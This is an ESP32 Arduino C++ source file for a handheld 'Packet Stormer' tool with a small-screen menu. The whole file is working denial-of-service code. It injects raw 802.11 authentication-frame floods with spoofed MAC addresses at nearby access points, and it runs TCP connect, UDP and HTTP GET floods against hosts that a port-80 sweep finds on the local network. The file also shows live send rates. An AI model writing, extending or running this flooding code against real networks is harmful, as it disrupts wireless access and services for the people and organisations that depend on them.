/* ____________________________
   See packetstormer.h for the design. Reuses the same WiFi-driver
   bring-up pattern as beaconspam.cpp/detector.cpp/packetmonitor.cpp for
   the SSID-flood (raw frame injection) mode, and the ordinary Arduino
   WiFi/WiFiClient/WiFiUDP API for the three IP-based modes.
   ________________________________________ */

#include "packetstormer.h"
#include "webdash.h"
#include "secrets.h"
#include <WiFi.h>
#include <WiFiUdp.h>
#include <esp_wifi.h>

static const uint16_t P_ORANGE = 0xfbe4;
static const uint16_t P_RED    = 0xf800;
static const uint16_t P_GREEN  = 0x07e0;

enum StormMode  { MODE_SSID, MODE_TCP, MODE_UDP, MODE_HTTP, MODE_COUNT };
enum StormPhase { PHASE_LIST, PHASE_RUNNING };

static StormMode  mode  = MODE_SSID;
static StormPhase phase = PHASE_LIST;
static int cursor = 0;   // 0 = "[change mode]" row; 1..N = a real target

static const int MAX_SSID_TARGETS = 10;
static String  ssidName[MAX_SSID_TARGETS];
static uint8_t ssidBssid[MAX_SSID_TARGETS][6];
static int     ssidChannel[MAX_SSID_TARGETS];
static int     ssidCount = 0;

static const int MAX_IP_TARGETS = 20;
static IPAddress ipTarget[MAX_IP_TARGETS];
static int        ipCount = 0;

static uint8_t   activeBssid[6];
static int        activeChannel = 1;
static IPAddress activeIp;

static uint32_t sentCount  = 0;
static uint32_t failCount  = 0;
static uint32_t statsStart = 0;
static uint32_t lastDraw   = 0;

static WiFiUDP udp;

static const char* modeName(StormMode m) {
  switch (m) {
    case MODE_SSID: return "SSID Flood";
    case MODE_TCP:  return "TCP Flood";
    case MODE_UDP:  return "UDP Flood";
    case MODE_HTTP: return "HTTP Flood";
    default:        return "?";
  }
}

static int targetCount() {
  return (mode == MODE_SSID) ? ssidCount : ipCount;
}

// ----------------------------------------------- SSID flood (raw 802.11) ---

static void sendAuthFrame(const uint8_t bssid[6]) {
  uint8_t pkt[30] = {
    0xB0, 0x00,                                              // Mgmt / Authentication
    0x00, 0x00,                                              // Duration
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // Addr1: dest BSSID
    0x02, 0, 0, 0, 0, 0,                                      // Addr2: fake src MAC (randomised below)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],  // Addr3: BSSID
    0x00, 0x00,                                               // Sequence control
    0x00, 0x00,                                               // Auth algorithm: Open System
    0x01, 0x00,                                               // Auth transaction seq: 1
    0x00, 0x00                                                // Status: success
  };
  for (int i = 1; i < 6; i++) pkt[10 + i] = random(256);
  esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
}

static void startSsidFlood(int idx) {
  memcpy(activeBssid, ssidBssid[idx], 6);
  activeChannel = ssidChannel[idx];

  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_disconnect();

  esp_event_loop_create_default();   // tolerated if already created elsewhere

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_err_t initret = esp_wifi_init(&cfg);
  if (initret != ESP_OK && initret != ESP_ERR_WIFI_INIT_STATE) {
    Serial.printf("[stormer] wifi init failed: %d\n", initret);
  }
  esp_wifi_start();
  esp_wifi_set_channel(activeChannel, WIFI_SECOND_CHAN_NONE);
}

// --------------------------------------------------- IP-based floods ------

static bool joinHomeWifi() {
  if (WiFi.status() == WL_CONNECTED) return true;
  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 8000) delay(50);
  return WiFi.status() == WL_CONNECTED;
}

// Best-effort "what's alive" probe: a TCP connect attempt to port 80 per
// host in the local /24. Not a real ARP scan — misses anything with no
// listener on 80, but needs no extra library.
static void scanLanTargets() {
  ipCount = 0;
  if (!joinHomeWifi()) return;

  IPAddress local = WiFi.localIP();
  for (int host = 1; host <= 254 && ipCount < MAX_IP_TARGETS; host++) {
    IPAddress candidate(local[0], local[1], local[2], host);
    if (candidate == local) continue;
    WiFiClient probe;
    bool alive = probe.connect(candidate, 80, 120);
    probe.stop();
    if (alive) ipTarget[ipCount++] = candidate;
  }
}

static void tcpFloodOnce() {
  WiFiClient c;
  if (c.connect(activeIp, 80, 150)) sentCount++; else failCount++;
  c.stop();
}

static void udpFloodOnce() {
  uint8_t payload[64];
  for (int i = 0; i < (int)sizeof(payload); i++) payload[i] = random(256);
  udp.beginPacket(activeIp, 9999);
  udp.write(payload, sizeof(payload));
  if (udp.endPacket()) sentCount++; else failCount++;
}

static void httpFloodOnce() {
  WiFiClient c;
  if (c.connect(activeIp, 80, 200)) {
    c.print("GET / HTTP/1.1\r\nHost: packetstormer\r\nConnection: close\r\n\r\n");
    uint32_t t0 = millis();
    while (c.connected() && millis() - t0 < 50) {
      if (c.available()) c.read();
    }
    sentCount++;
  } else {
    failCount++;
  }
  c.stop();
}

// ------------------------------------------------------------------- UI ---

static void rescanForMode() {
  tft.fillScreen(ST7735_BLACK);
  tft.fillRect(0, 0, tft.width(), 20, P_ORANGE);
  tft.setTextColor(ST7735_BLACK);
  tft.setTextWrap(false);
  tft.setTextSize(1);
  tft.setCursor(4, 4);
  tft.print("Packet Stormer");
  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(4, 30);
  tft.println(mode == MODE_SSID ? "scanning WiFi..." : "scanning LAN...");

  if (mode == MODE_SSID) {
    ssidCount = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n && ssidCount < MAX_SSID_TARGETS; i++) {
      ssidName[ssidCount] = WiFi.SSID(i);
      memcpy(ssidBssid[ssidCount], WiFi.BSSID(i), 6);
      ssidChannel[ssidCount] = WiFi.channel(i);
      ssidCount++;
    }
    WiFi.scanDelete();
  } else {
    scanLanTargets();
  }
  cursor = 0;
}

static void drawList() {
  tft.fillScreen(ST7735_BLACK);
  tft.fillRect(0, 0, tft.width(), 20, P_ORANGE);
  tft.setTextColor(ST7735_BLACK);
  tft.setTextWrap(false);
  tft.setTextSize(1);
  tft.setCursor(4, 4);
  tft.print(modeName(mode));

  int n = targetCount();
  int y = 28;
  for (int row = 0; row <= n; row++) {
    tft.setCursor(4, y);
    tft.setTextColor(row == cursor ? P_ORANGE : ST7735_WHITE);
    if (row == 0) {
      tft.println("[change mode]");
    } else if (mode == MODE_SSID) {
      tft.println(ssidName[row - 1] + "  ch" + String(ssidChannel[row - 1]));
    } else {
      tft.println(ipTarget[row - 1].toString());
    }
    y += 12;
  }
  if (n == 0) {
    tft.setTextColor(ST7735_WHITE);
    tft.setCursor(4, y + 4);
    tft.println("(no targets found)");
  }

  String lines[8];
  int cnt = 0;
  lines[cnt++] = String("mode: ") + modeName(mode);
  for (int row = 0; row < n && cnt < 7; row++) {
    if (mode == MODE_SSID) lines[cnt++] = ssidName[row] + "  ch" + String(ssidChannel[row]);
    else lines[cnt++] = ipTarget[row].toString();
  }
  dashSetStatus("Packet Stormer", lines, cnt);
}

static void drawRunning() {
  tft.fillScreen(ST7735_BLACK);
  tft.fillRect(0, 0, tft.width(), 20, P_ORANGE);
  tft.setTextColor(ST7735_BLACK);
  tft.setTextWrap(false);
  tft.setTextSize(1);
  tft.setCursor(4, 4);
  tft.print(modeName(mode));

  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(4, 30);
  String targetDesc;
  if (mode == MODE_SSID) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             activeBssid[0], activeBssid[1], activeBssid[2],
             activeBssid[3], activeBssid[4], activeBssid[5]);
    targetDesc = String(buf) + "  ch" + String(activeChannel);
  } else {
    targetDesc = activeIp.toString();
  }
  tft.println("target: " + targetDesc);

  float secs = (millis() - statsStart) / 1000.0f;
  if (secs < 0.5f) secs = 0.5f;

  tft.setCursor(4, 50);
  tft.println("sent: " + String(sentCount));
  tft.setCursor(4, 62);
  tft.println("rate: " + String(sentCount / secs, 1) + "/s");
  tft.setCursor(4, 74);
  tft.setTextColor(failCount ? P_RED : P_GREEN);
  tft.println("fail: " + String(failCount));

  tft.setTextColor(ST7735_WHITE);
  tft.setCursor(4, 94);
  tft.println("2x BOOT: stop");

  String lines[3] = {
    "target: " + targetDesc,
    "sent: " + String(sentCount) + "  fail: " + String(failCount),
    "rate: " + String(sentCount / secs, 1) + "/s"
  };
  dashSetStatus((String(modeName(mode)) + " - running").c_str(), lines, 3);
}

// ----------------------------------------------------------- entrypoints --

void stormerSetup() {
  mode = MODE_SSID;
  phase = PHASE_LIST;
  cursor = 0;
  sentCount = 0;
  failCount = 0;
  rescanForMode();
  drawList();
}

void stormerLoop() {
  if (phase == PHASE_LIST) {
    int n = targetCount();

    if (inputNext()) {
      cursor = (cursor + 1) % (n + 1);
      drawList();
    }

    if (inputSelect()) {
      if (cursor == 0) {
        mode = (StormMode)((mode + 1) % MODE_COUNT);
        rescanForMode();
        drawList();
      } else if (n > 0) {
        int idx = cursor - 1;
        sentCount = 0;
        failCount = 0;
        statsStart = millis();
        switch (mode) {
          case MODE_SSID: startSsidFlood(idx); break;
          case MODE_TCP:  activeIp = ipTarget[idx]; joinHomeWifi(); break;
          case MODE_UDP:  activeIp = ipTarget[idx]; joinHomeWifi(); break;
          case MODE_HTTP: activeIp = ipTarget[idx]; joinHomeWifi(); break;
          default: break;
        }
        phase = PHASE_RUNNING;
        drawRunning();
      }
    }
    return;
  }

  // PHASE_RUNNING
  switch (mode) {
    case MODE_SSID: sendAuthFrame(activeBssid); break;
    case MODE_TCP:  tcpFloodOnce(); break;
    case MODE_UDP:  udpFloodOnce(); break;
    case MODE_HTTP: httpFloodOnce(); break;
    default: break;
  }

  if (inputSelect()) {
    phase = PHASE_LIST;
    drawList();
  } else if (millis() - lastDraw > 250) {
    lastDraw = millis();
    drawRunning();
  }
}
